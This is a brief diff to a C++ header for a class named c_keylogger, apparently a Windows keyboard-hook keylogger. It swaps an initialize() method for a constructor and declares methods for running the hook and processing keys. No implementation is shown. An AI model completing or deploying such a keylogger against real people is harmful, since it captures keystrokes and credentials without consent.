@@ -11,9 +11,10 @@
 class c_keylogger
 {
 public:
+    c_keylogger();
+
     const HHOOK hook() const { return m_hook; }
 
-    void initialize();
     WPARAM run() const;
     void process_key(int code) const;
 
